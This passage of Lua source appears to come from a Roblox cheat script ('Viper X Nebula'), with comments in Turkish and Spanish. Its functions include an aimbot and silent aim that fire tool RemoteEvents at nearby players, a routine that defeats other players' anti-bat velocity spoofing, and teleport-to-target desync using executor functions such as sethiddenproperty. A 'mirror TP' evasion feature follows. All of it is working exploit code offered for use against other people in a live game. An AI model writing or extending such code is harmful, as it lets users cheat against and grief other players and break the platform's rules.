            -- Anti-Bat Bypass: Hedefin RootPart'ina dogrudan server remote tetikleme (desync ve velocity spoof deler)
            local targetHRP = target and (target:IsA("BasePart") and target or target:FindFirstChild("HumanoidRootPart"))
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then
                pcall(function() ev:FireServer() end)
                if targetHRP then
                    pcall(function() ev:FireServer(targetHRP) end)
                    pcall(function() ev:FireServer(targetHRP.Parent, targetHRP) end)
                end
            else
                for _, ch in ipairs(bat:GetDescendants()) do
                    if ch:IsA("RemoteEvent") and not ch.Name:lower():find("drop") and not ch.Name:lower():find("unequip") then
                        pcall(function() ch:FireServer() end)
                        if targetHRP then
                            pcall(function() ch:FireServer(targetHRP) end)
                        end
                    end
                end
            end
        end
    end)
end

function stopAimbotAdapt()
    if _aimbotConn then
        pcall(function() _aimbotConn:Disconnect() end)
        _aimbotConn = nil
    end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = (_prevAutoRotate == nil) and true or _prevAutoRotate
        hum.PlatformStand = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
    end
    if root then
        root.AssemblyLinearVelocity = _V3new(0, -0.1, 0)
        root.AssemblyAngularVelocity = _V3zero
    end
    _prevAutoRotate = nil
    lastMoveDir = _V3zero
    _unsuppressBodyLock(true)
end

function startAimbotAdapt()
    if _aimbotConn then return end
    _suppressBodyLock()
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then
        if _prevAutoRotate == nil then _prevAutoRotate = hum0.AutoRotate end
        hum0.AutoRotate = false
    end
    _aimbotConn = RunService.RenderStepped:Connect(function()
        if not autoBatEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end

        if not char:FindFirstChildOfClass("Tool") then
            local bat = findBat()
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end

        local target = getClosestTarget()
        if not target then return end

        -- =====================================================================
        -- ANTI-BAT BYPASS FILTRESI
        -- Menumuzdeki Anti-Bat (500, y, 500) ve harici hub'lar (IrishHub, Violette,
        -- Cryptic) AssemblyLinearVelocity degerini 500-4500 arasina firlatir.
        -- Normal oyuncu hizi max ~32 studs/s'dir.
        -- Hedefin hizi > 60 studs/s ise sahte fizik hizini yoksay; hedefin gercek
        -- MoveDirection * WalkSpeed degerini kullanarak tahmin yap.
        -- =====================================================================
        local targetVel = target.AssemblyLinearVelocity
        local targetChar = target.Parent
        local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")

        if targetVel.Magnitude > 60 then
            if targetHum then
                local realDir = targetHum.MoveDirection
                local realSpd = targetHum.WalkSpeed
                if realSpd <= 0 or realSpd > 120 then realSpd = 16 end
                targetVel = _V3new(realDir.X * realSpd, _clamp(targetVel.Y, -40, 40), realDir.Z * realSpd)
            else
                targetVel = _V3new(0, _clamp(targetVel.Y, -40, 40), 0)
            end
        end

        local myPos = root.Position
        local targetPos = target.Position

        if selectedAimbotMode == "V2" then
            -- =================================================================
            -- VIPER X NEBULA - COMBAT AIMBOT V2 (YAKIN ON MESAFE & GID-GEL DONGUSU)
            -- =================================================================
            local rawLook = target.CFrame.LookVector
            local targetLook = Vector3.new(rawLook.X, 0, rawLook.Z)
            if targetLook.Magnitude > 0.01 then
                targetLook = targetLook.Unit
            else
                targetLook = Vector3.new(0, 0, -1)
            end

            -- Dinamik sinüs dalgali ileri-geri gidip gelme mesafesi (1.0 ile 2.8 stud arasi)
            local frontOffset = 1.0 + (math.abs(math.sin(tick() * 10)) * 1.8)
            local frontPos = targetPos + targetLook * frontOffset

            -- Hedefin hareket yonune gore onde olma tahmini
            local predictPos = frontPos + targetVel * 0.12
            local direction = predictPos - myPos
            local flatDir = Vector3.new(direction.X, 0, direction.Z)
            if flatDir.Magnitude > 0 then
                flatDir = flatDir.Unit
            else
                flatDir = Vector3.new(0, 0, 0)
            end

            local desiredHeight = targetPos.Y + 2.8
            local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
            if hum.FloorMaterial ~= Enum.Material.Air then
                yVel = math.max(yVel, 13)
            end
            yVel = math.clamp(yVel, -70, 110)

            local chaseSpeed = BAT_AIMBOT_SPEED or 65
            if desyncCarryToggled or desyncSpeedToggled then
                chaseSpeed = DESYNC_AIMBOT_SPEED or 37
            elseif laggerCarryToggled or laggerToggled then
                chaseSpeed = LAGGER_AIMBOT_SPEED or 58
            end
            chaseSpeed = math.clamp(tonumber(chaseSpeed) or 65, 1, 500)

            local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
            root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.88)

            -- Hedefe kilitlenme ve govde dondurme
            local speed3 = targetVel.Magnitude
            local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
            local predictedPos = targetPos + targetVel * predictTime
            local toPredict = predictedPos - myPos
            if toPredict.Magnitude > 0.1 then
                local goalCF = CFrame.lookAt(myPos, predictedPos)
                local diffCF = root.CFrame:Inverse() * goalCF
                local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
                rx = math.clamp(rx, -2.5, 2.5)
                ry = math.clamp(ry, -2.5, 2.5)
                rz = math.clamp(rz, -2.5, 2.5)
                root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
            end

            local targetPart = target:IsA("BasePart") and target or target:FindFirstChild("HumanoidRootPart")
            local distToTarget = targetPart and (root.Position - targetPart.Position).Magnitude or 999
            if distToTarget <= 7.5 then
                trySwing(target)
            end
        else
            local predictPos = targetPos + targetVel * 0.14
            predictPos = predictPos + target.CFrame.LookVector * 0.3
            local direction = predictPos - myPos
            local flatDir = _V3new(direction.X, 0, direction.Z)
            if flatDir.Magnitude > 0 then flatDir = flatDir.Unit else flatDir = _V3new(0,0,0) end
            local desiredHeight = targetPos.Y + 3.7
            local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
            if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
            yVel = _clamp(yVel, -70, 110)

            local chaseSpeed = BAT_AIMBOT_SPEED or 59
            if desyncCarryToggled or desyncSpeedToggled then
                chaseSpeed = DESYNC_AIMBOT_SPEED or 37
            elseif laggerCarryToggled or laggerToggled then
                chaseSpeed = LAGGER_AIMBOT_SPEED or 58
            end
            chaseSpeed = _clamp(tonumber(chaseSpeed) or 59, 1, 500)

            local desiredVel = _V3new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
            root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)

            local speed3 = targetVel.Magnitude
            local predictTime = _clamp(speed3 / 150, 0.05, 0.2)
            local predictedPos = targetPos + targetVel * predictTime
            local toPredict = predictedPos - myPos
            if toPredict.Magnitude > 0.1 then
                local goalCF = _CFlookAt(myPos, predictedPos)
                local diffCF = root.CFrame:Inverse() * goalCF
                local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
                rx = _clamp(rx, -2.5, 2.5)
                ry = _clamp(ry, -2.5, 2.5)
                rz = _clamp(rz, -2.5, 2.5)
                root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(_V3new(rx * 42, ry * 42, rz * 42))
            end

            local distToTarget = (root.Position - target.Position).Magnitude
            if distToTarget <= 8.5 then trySwing(target) end
        end

        -- Anti-Ragdoll / Anti-Knockdown (Aimbot sirasinda yere dusmeyi engeller)
        local st = hum:GetState()
        if hum.PlatformStand or st == Enum.HumanoidStateType.Physics
           or st == Enum.HumanoidStateType.Ragdoll
           or st == Enum.HumanoidStateType.FallingDown then
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                hum:ChangeState(Enum.HumanoidStateType.Running)
                hum.PlatformStand = false
            end)
        end
    end)
end

function disableAutoBat()
    autoBatEnabled = false
    if autoBatSetVisual then autoBatSetVisual(false) end
    if mobSetAutoBat then mobSetAutoBat(false) end
    stopAimbotAdapt()
end

function enableAutoBat()
    if bypassAimbotEnabled and disableBypassAimbot then disableBypassAimbot() end
    if autoLeftEnabled then
        autoLeftEnabled = false
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        stopAutoLeft()
    end
    if autoRightEnabled then
        autoRightEnabled = false
        if autoRightSetVisual then autoRightSetVisual(false) end
        stopAutoRight()
    end
    if batDesyncTpEnabled then toggleBatDesyncTp() end
    autoBatEnabled = true
    if autoBatSetVisual then autoBatSetVisual(true) end
    if mobSetAutoBat then mobSetAutoBat(true) end
    startAimbotAdapt()
end


local _silentAimConn = nil
local _silentAimRangeRing = nil

function getSilentAimRangeRing()
    if _silentAimRangeRing and _silentAimRangeRing.Parent then return _silentAimRangeRing end
    local ring = Instance.new("CylinderHandleAdornment")
    ring.Name = "BatRangeRing"
    ring.Height = 0.05
    ring.Color3 = Color3.fromRGB(0, 255, 255)
    ring.Transparency = 0.2
    ring.AlwaysOnTop = true
    ring.ZIndex = 0
    ring.Visible = false
    local safeParent = getSafeESPFolder()
    if safeParent then
        safeProtectGui(ring)
        ring.Parent = safeParent
    end
    _silentAimRangeRing = ring
    return ring
end

function stopSilentAim()
    silentAimEnabled = false
    if _silentAimConn then
        pcall(function() _silentAimConn:Disconnect() end)
        _silentAimConn = nil
    end
    if _silentAimRangeRing then
        _silentAimRangeRing.Visible = false
    end
    if setSilentAimVisual then setSilentAimVisual(false) end
end

function startSilentAim()
    stopSilentAim()
    silentAimEnabled = true
    if setSilentAimVisual then setSilentAimVisual(true) end
    local ring = getSilentAimRangeRing()
    _silentAimConn = RunService.Heartbeat:Connect(function()
        if not silentAimEnabled then
            if ring then ring.Visible = false end
            return
        end
        
        if autoBatEnabled then
            if ring then ring.Visible = false end
            return
        end
        local char = LP.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChildOfClass("Humanoid") then
            if ring then ring.Visible = false end
            return
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char.HumanoidRootPart
        if hum.Health <= 0 then
            if ring then ring.Visible = false end
            return
        end

        local heldTool = char:FindFirstChildOfClass("Tool")
        if not heldTool or not isBatTool(heldTool) then
            if ring then ring.Visible = false end
            return
        end

        local studRange = tonumber(silentAimStudRange) or 15
        ring.Adornee = hrp
        ring.Radius = studRange
        ring.InnerRadius = math.max(0.1, studRange - 0.2)
        ring.CFrame = CFrame.new(0, -hrp.Size.Y/2 - 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
        ring.Visible = true

        local nearestTarget = nil
        local nearestDist = math.huge
        local myPos = hrp.Position
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local tHum = player.Character:FindFirstChildOfClass("Humanoid")
                if tHum and tHum.Health > 0 then
                    local dist = (myPos - player.Character.HumanoidRootPart.Position).Magnitude
                    if dist <= studRange and dist < nearestDist then
                        nearestDist = dist
                        nearestTarget = player.Character
                    end
                end
            end
        end

        if nearestTarget then
            local handle = heldTool:FindFirstChild("Handle")
            if handle then
                pcall(function()
                    handle.Massless = true
                    handle.CanCollide = false
                end)
            end
            pcall(function() heldTool:Activate() end)

            local targetHRP = nearestTarget:FindFirstChild("HumanoidRootPart")
            local ev = heldTool:FindFirstChildWhichIsA("RemoteEvent")
            if ev then
                pcall(function() ev:FireServer() end)
                if targetHRP then
                    pcall(function() ev:FireServer(targetHRP) end)
                    pcall(function() ev:FireServer(targetHRP.Parent, targetHRP) end)
                end
            else
                for _, ch in ipairs(heldTool:GetDescendants()) do
                    if ch:IsA("RemoteEvent") and not ch.Name:lower():find("drop") and not ch.Name:lower():find("unequip") then
                        pcall(function() ch:FireServer() end)
                        if targetHRP then
                            pcall(function() ch:FireServer(targetHRP) end)
                        end
                        break
                    end
                end
            end
        end
    end)
end

local _autoMedusaConn = nil
local _medusaRangeRing = nil

function getMedusaRangeRing()
    if _medusaRangeRing and _medusaRangeRing.Parent then return _medusaRangeRing end
    local ring = Instance.new("CylinderHandleAdornment")
    ring.Name = "MedusaRangeRing"
    ring.Height = 0.05
    ring.Color3 = Color3.fromRGB(0, 255, 255)
    ring.Transparency = 0.2
    ring.AlwaysOnTop = true
    ring.ZIndex = 0
    ring.Visible = false
    local safeParent = getSafeESPFolder()
    if safeParent then
        safeProtectGui(ring)
        ring.Parent = safeParent
    end
    _medusaRangeRing = ring
    return ring
end

function stopAutoMedusa()
    autoMedusaEnabled = false
    if _autoMedusaConn then
        pcall(function() _autoMedusaConn:Disconnect() end)
        _autoMedusaConn = nil
    end
    if _medusaRangeRing then
        _medusaRangeRing.Visible = false
    end
    if setMedusaAutoVisual then setMedusaAutoVisual(false) end
end

function startAutoMedusa()
    stopAutoMedusa()
    autoMedusaEnabled = true
    if setMedusaAutoVisual then setMedusaAutoVisual(true) end
    local ring = getMedusaRangeRing()
    _autoMedusaConn = RunService.Heartbeat:Connect(function()
        if not autoMedusaEnabled then
            if ring then ring.Visible = false end
            return
        end
        local char = LP.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChildOfClass("Humanoid") then
            if ring then ring.Visible = false end
            return
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char.HumanoidRootPart
        if hum.Health <= 0 then
            if ring then ring.Visible = false end
            return
        end
        local medusaInHand = nil
        for _, item in pairs(char:GetChildren()) do
            if item:IsA("Tool") and string.find(string.lower(item.Name), "medusa") then
                medusaInHand = item
                break
            end
        end
        if not medusaInHand then
            if ring then ring.Visible = false end
            return
        end

        local studRange = tonumber(autoMedusaStudRange) or 15
        ring.Adornee = hrp
        ring.Radius = studRange
        ring.InnerRadius = math.max(0.1, studRange - 0.2)
        ring.CFrame = CFrame.new(0, -hrp.Size.Y/2 - 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
        ring.Visible = true
        local targetFound = false
        local myPos = hrp.Position
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local tHum = player.Character:FindFirstChildOfClass("Humanoid")
                if tHum and tHum.Health > 0 then
                    local dist = (myPos - player.Character.HumanoidRootPart.Position).Magnitude
                    if dist <= studRange then
                        targetFound = true
                        break
                    end
                end
            end
        end
        
        if targetFound then
            pcall(function() medusaInHand:Activate() end)
        end
    end)
end


local batDesyncTpEnabled = false
local batDesyncTpConn = nil
local batDesyncTpSetVisual = nil
local hittingCooldownDesync = false
local _tpBatUnwalkForced = false

function getBatDesync()
    local char = LP.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool then return tool end
    local bp2 = LP:FindFirstChild("Backpack")
    if bp2 then
        tool = bp2:FindFirstChild("Bat")
        if tool then
            tool.Parent = char
            return tool
        end
    end
    return nil
end

function tryHitBatDesync()
    if hittingCooldownDesync then return end
    hittingCooldownDesync = true
    pcall(function()
        local bat = getBatDesync()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function() hittingCooldownDesync = false end)
end

function getClosestPlayerDesync()
    local char = LP.Character
    if not char then return nil, _huge end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil, _huge end
    local hpos = hrp.Position
    local cp, cd = nil, _huge
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local tr = p.Character:FindFirstChild("HumanoidRootPart")
            if tr then
                local d = (hpos - tr.Position).Magnitude
                if d < cd then cd = d; cp = p end
            end
        end
    end
    return cp, cd
end

-- [VIPER] Marcador azul de ultima posicion
do
    local VIPER_MARKER_DISTANCE   = 3
    local VIPER_MIN_X, VIPER_MAX_X = -536.2, -422
    local VIPER_MIN_Y, VIPER_MAX_Y = -10,    75
    local VIPER_MIN_Z, VIPER_MAX_Z = -71.8, 192.9
    local VIPER_GROUND_Y          = -7
    local VIPER_LOOKBACK          = 0.2
    local VIPER_SAMPLE_INTERVAL   = 1 / 60

    local markerState = {
        markerLocked = false,
        markerTarget = nil,
        lastMarker   = nil,
        samples      = {},
        accumulator  = 0,
    }

    local function isInsideAllowedArea(pos)
        if not pos then return false end
        return pos.X >= VIPER_MIN_X and pos.X <= VIPER_MAX_X
           and pos.Y >= VIPER_MIN_Y and pos.Y <= VIPER_MAX_Y
           and pos.Z >= VIPER_MIN_Z and pos.Z <= VIPER_MAX_Z
    end

    local function finiteVector(v)
        return v ~= nil
            and v.X == v.X and v.Y == v.Y and v.Z == v.Z
            and math.abs(v.X) < 1e7
            and math.abs(v.Y) < 1e7
            and math.abs(v.Z) < 1e7
    end

    local function hideMarkerVisuals(marker)
        if not marker then return end
        pcall(function()
            marker.Transparency = 1
            local s = marker:FindFirstChild("AlwaysOnTopSphere")
            if s then s.Visible = false end
            local h = marker:FindFirstChild("LastPositionHighlight")
            if h then h.Enabled = false end
            local b = marker:FindFirstChild("LastPositionLabel")
            if b then b.Enabled = false end
        end)
    end

    local function clearLastMarker()
        markerState.markerLocked = false
        if markerState.lastMarker then
            hideMarkerVisuals(markerState.lastMarker)
        end
    end

    local function getLastMarkerCFrame()
        local marker = markerState.lastMarker
        if not (markerState.markerLocked and marker and marker.Parent and marker.Transparency < 1) then
            return nil
        end
        local tracked = markerState.markerTarget
        local trackedRoot = tracked and tracked.Character
                             and tracked.Character:FindFirstChild("HumanoidRootPart")
        if trackedRoot and isInsideAllowedArea(trackedRoot.Position) then
            clearLastMarker()
            return nil
        end
        local myChar = LP.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myRoot then return marker.CFrame end
        local away = Vector3.new(
            myRoot.Position.X - marker.Position.X, 0,
            myRoot.Position.Z - marker.Position.Z
        )
        if away.Magnitude <= 0.05 then
            local look = marker.CFrame.LookVector
            away = Vector3.new(-look.X, 0, -look.Z)
        end
        if away.Magnitude <= 0.05 then away = Vector3.new(0, 0, 1) end
        local teleportPos = marker.Position + away.Unit * VIPER_MARKER_DISTANCE
        local flat = Vector3.new(
            marker.Position.X - teleportPos.X, 0,
            marker.Position.Z - teleportPos.Z
        )
        if flat.Magnitude > 0.05 then
            return _CFlookAt(teleportPos, teleportPos + flat.Unit)
        end
        return _CFnew(teleportPos)
    end

    local function createOrUpdateMarker(targetCFrame)
        if markerState.markerLocked then return end
        local tracked = markerState.markerTarget
        if not tracked or tracked.Parent ~= Players then return end
        local char = tracked.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end
        if not finiteVector(root.Position) then return end
        if isInsideAllowedArea(root.Position) then return end
        if not targetCFrame or not isInsideAllowedArea(targetCFrame.Position) then return end

        local groundCF = _CFnew(
            targetCFrame.Position.X,
            VIPER_GROUND_Y,
            targetCFrame.Position.Z
        ) * targetCFrame.Rotation

        local marker = markerState.lastMarker
        if not marker or not marker.Parent then
            marker = Instance.new("Part")
            marker.Name         = "ViperTPBatLastPosition"
            marker.Shape        = Enum.PartType.Ball
            marker.Size         = Vector3.new(3, 3, 3)
            marker.Color        = Color3.fromRGB(0, 110, 255)
            marker.Material     = Enum.Material.Neon
            marker.Anchored     = true
            marker.CanCollide   = false
            marker.CanTouch     = false
            marker.CanQuery     = false
            marker.CastShadow   = false
            marker.Parent       = Workspace

            local overlay = Instance.new("SphereHandleAdornment")
            overlay.Name        = "AlwaysOnTopSphere"
            overlay.Adornee     = marker
            overlay.Radius      = 1.55
            overlay.Color3      = Color3.fromRGB(0, 125, 255)
            overlay.Transparency = 0.05
            overlay.AlwaysOnTop = true
            overlay.Visible     = true
            overlay.ZIndex      = 10
            overlay.Parent      = marker

            local hl = Instance.new("Highlight")
            hl.Name = "LastPositionHighlight"
            hl.Adornee = marker
            hl.FillColor = Color3.fromRGB(0, 110, 255)
            hl.FillTransparency = 0.15
            hl.OutlineColor = Color3.fromRGB(120, 200, 255)
            hl.OutlineTransparency = 0
            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            hl.Enabled = true
            hl.Parent = marker

            local bb = Instance.new("BillboardGui")
            bb.Name = "LastPositionLabel"
            bb.Size = UDim2.new(0, 110, 0, 20)
            bb.StudsOffset = Vector3.new(0, 2.1, 0)
            bb.AlwaysOnTop = true
            bb.Adornee = marker
            bb.Parent = marker

            local lbl = Instance.new("TextLabel")
            lbl.Name = "Text"
            lbl.Size = UDim2.fromScale(1, 1)
            lbl.BackgroundTransparency = 1
            lbl.Text = "ultima posicion"
            lbl.TextColor3 = Color3.fromRGB(220, 235, 255)
            lbl.TextStrokeColor3 = Color3.fromRGB(0, 35, 90)
            lbl.TextStrokeTransparency = 0.25
            lbl.TextSize = 11
            lbl.Font = Enum.Font.GothamMedium
            lbl.Parent = bb

            markerState.lastMarker = marker
        end

        marker.Transparency = 0
        local s = marker:FindFirstChild("AlwaysOnTopSphere");      if s then s.Visible = true end
        local h = marker:FindFirstChild("LastPositionHighlight");  if h then h.Enabled = true end
        local b = marker:FindFirstChild("LastPositionLabel");      if b then b.Enabled = true end
        marker.CFrame = groundCF
        markerState.markerLocked = true
    end

    local function snapshotBeforeExit(history, now)
        if not history or #history == 0 then return nil end
        local cutoff = now - VIPER_LOOKBACK
        local selected
        for _, entry in ipairs(history) do
            if entry.time <= cutoff then selected = entry else break end
        end
        return selected or history[1]
    end

    local function pickClosestEnemy(myRoot)
        local closest, bestDistSq = nil, _huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local r = plr.Character:FindFirstChild("HumanoidRootPart")
                local h = plr.Character:FindFirstChildOfClass("Humanoid")
                if r and h and h.Health > 0 and finiteVector(r.Position) then
                    local d = (r.Position - myRoot.Position).Magnitude
                    if d < bestDistSq then closest = plr; bestDistSq = d end
                end
            end
        end
        return closest
    end

    local function monitorLastTarget()
        local myChar = LP.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myRoot then return end

        local tracked = markerState.markerTarget
        if tracked and tracked.Parent == Players then
            local char = tracked.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            local sample = markerState.samples[tracked] or {}
            markerState.samples[tracked] = sample

            if root and hum and hum.Health > 0 and finiteVector(root.Position) then
                if isInsideAllowedArea(root.Position) then
                    local now = _tick()
                    if markerState.markerLocked then sample.history = {} end
                    sample.history = sample.history or {}
                    table.insert(sample.history, { time = now, safeCFrame = root.CFrame })
                    while sample.history[1]
                        and now - sample.history[1].time > (VIPER_LOOKBACK + 0.25) do
                        table.remove(sample.history, 1)
                    end
                    sample.safeCFrame = root.CFrame
                    if markerState.markerLocked then clearLastMarker() end
                else
                    local snap = snapshotBeforeExit(sample.history, _tick())
                    createOrUpdateMarker((snap and snap.safeCFrame) or sample.safeCFrame)
                end
            end

            if (hum and hum.Health <= 0) or (not root and not sample.safeCFrame) then
                markerState.markerTarget = nil
                clearLastMarker()
            else
                return
            end
        end

        local closest = pickClosestEnemy(myRoot)
        if closest then
            markerState.markerTarget = closest
            local r = closest.Character:FindFirstChild("HumanoidRootPart")
            if r then
                local sample = markerState.samples[closest] or {}
                markerState.samples[closest] = sample
                sample.safeCFrame = r.CFrame
                sample.history = { { time = _tick(), safeCFrame = r.CFrame } }
            end
        end
    end

    local monitorConn = RunService.Heartbeat:Connect(function(dt)
        markerState.accumulator = markerState.accumulator + (dt or 0)
        if markerState.accumulator < VIPER_SAMPLE_INTERVAL then return end
        markerState.accumulator = markerState.accumulator % VIPER_SAMPLE_INTERVAL
        pcall(monitorLastTarget)
    end)

    _G.ViperGetLastMarkerCFrame = getLastMarkerCFrame
    _G.ViperClearLastMarker     = clearLastMarker
    _G.ViperMarkerConn          = monitorConn

    LP.CharacterAdded:Connect(function()
        clearLastMarker()
        markerState.markerTarget = nil
        markerState.samples      = {}
    end)
end

function batDesyncTpUpdate()
    if not batDesyncTpEnabled then
        stopBatDesyncTp()
        return
    end
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if _G.ViperGetLastMarkerCFrame then
        local markerCF = _G.ViperGetLastMarkerCFrame()
        if markerCF then
            pcall(function()
                if hrp.SetNetworkOwner then hrp:SetNetworkOwner(LP) end
            end)
            if sethiddenproperty then
                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", hrp) end)
            end
            hrp.CFrame = markerCF
            local cam = workspace.CurrentCamera
            if cam then
                cam.CFrame = _CFnew(cam.CFrame.Position, markerCF.Position)
            end
            tryHitBatDesync()
            return
        end
    end

    local target = getClosestPlayerDesync()
    if target and target.Character then
        local tr = target.Character:FindFirstChild("HumanoidRootPart")
        if tr then
            if sethiddenproperty then
                pcall(function()
                    sethiddenproperty(hrp, "PhysicsRepRootPart", tr)
                end)
            end
            local targetPos = tr.Position + _V3new(0, 0.9, 0)
            if (hrp.Position - targetPos).Magnitude > 8 then
                hrp.CFrame = _CFnew(targetPos)
            end
            local cam = workspace.CurrentCamera
            if cam then
                cam.CFrame = _CFnew(cam.CFrame.Position, tr.Position)
            end
            tryHitBatDesync()
        end
    end
end

function startBatDesyncTp()
    if batDesyncTpConn then return end
    if not unwalkEnabled then
        startUnwalk()
        unwalkEnabled = true
        _tpBatUnwalkForced = true
        if setUnwalkVisual then setUnwalkVisual(true) end
    end
    batDesyncTpEnabled = true
    batDesyncTpConn = RunService.Heartbeat:Connect(batDesyncTpUpdate)
    if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
end

function stopBatDesyncTp()
    if batDesyncTpConn then
        batDesyncTpConn:Disconnect()
        batDesyncTpConn = nil
    end
    batDesyncTpEnabled = false
    if _tpBatUnwalkForced then
        stopUnwalk()
        unwalkEnabled = false
        _tpBatUnwalkForced = false
        if setUnwalkVisual then setUnwalkVisual(false) end
    end
    if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
end

function toggleBatDesyncTp()
    if batDesyncTpEnabled then
        stopBatDesyncTp()
    else
        disableAllAimbots()
        if autoLeftEnabled then
            autoLeftEnabled = false; stopAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(false) end
            if mobSetAutoLeft then mobSetAutoLeft(false) end
        end
        if autoRightEnabled then
            autoRightEnabled = false; stopAutoRight()
            if autoRightSetVisual then autoRightSetVisual(false) end
            if mobSetAutoRight then mobSetAutoRight(false) end
        end
        startBatDesyncTp()
    end
    if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
    saveAllSettings()
end

-- =====================================================================
-- MIRROR TP DOWN V2
-- Rakip aimbot sirasinda yukaridan dusunce seni -7 Y'ye indirir.
-- Yatay hiz (aimbot / speed ayarlari) korunur, sadece Y sifirlanir.
-- =====================================================================
mirrorTPDownV2Enabled = false
setMirrorTPV2Visual = nil

local _MTP = {
    conn = nil,
    prevY = {},
    lastTeleport = 0,
    DROP_THRESHOLD = 3,
    DOWN_Y = -7.00,
    MAX_RANGE = 70,
}

function _mtpAimbotActive()
    return autoBatEnabled == true
        or bypassAimbotEnabled == true
        or batDesyncTpEnabled == true
        or _G.MirrorNormalAimbotOn == true
        or _G.MirrorAntiBypassAimbotOn == true
        or _G.MirrorAntiDesyncAimbotOn == true
end

function _mtpTeleportDown()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not hum or hum.Health <= 0 then return end
    if dropActive or _G.IsDropping then return end

    local now = _tick()
    if now - _MTP.lastTeleport < 0.08 then return end
    _MTP.lastTeleport = now

    local vel = root.AssemblyLinearVelocity
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    root.CFrame = _CFnew(root.Position.X, _MTP.DOWN_Y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    root.AssemblyLinearVelocity = _V3new(vel.X, 0, vel.Z)
end

function _mtpStep()
    if not mirrorTPDownV2Enabled or not _mtpAimbotActive() then
        table.clear(_MTP.prevY)
        return
    end
    local myChar = LP.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end

    local plist = _GetPlayersCached()
    for i = 1, #plist do
        local plr = plist[i]
        if plr ~= LP and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root and (root.Position - myRoot.Position).Magnitude <= _MTP.MAX_RANGE then
                local currentY = root.Position.Y
                local previousY = _MTP.prevY[plr.UserId]
                if previousY and previousY - currentY >= _MTP.DROP_THRESHOLD then
                    table.clear(_MTP.prevY)
                    pcall(_mtpTeleportDown)
                    if type(showActionNotification) == "function" then
                        pcall(showActionNotification, "MIRROR TP!")
                    end
                    return
                end
                _MTP.prevY[plr.UserId] = currentY
            end
        end
    end
end

function setMirrorTPDownV2(on)
    mirrorTPDownV2Enabled = on == true
    if mirrorTPDownV2Enabled then
        if not _MTP.conn then
            _MTP.conn = RunService.Heartbeat:Connect(function() pcall(_mtpStep) end)
        end
    else
        if _MTP.conn then _MTP.conn:Disconnect(); _MTP.conn = nil end
        table.clear(_MTP.prevY)
    end
    if setMirrorTPV2Visual then setMirrorTPV2Visual(mirrorTPDownV2Enabled) end
end

function toggleMirrorTPDownV2()
    setMirrorTPDownV2(not mirrorTPDownV2Enabled)
    saveAllSettings()
end

_G.MirrorSetTPDown = setMirrorTPDownV2

-- =====================================================================
-- BYPASS AIMBOT
-- Yakin rakibe kilitlenir, hizi Speed sekmesindeki "aimbot" kutusundan
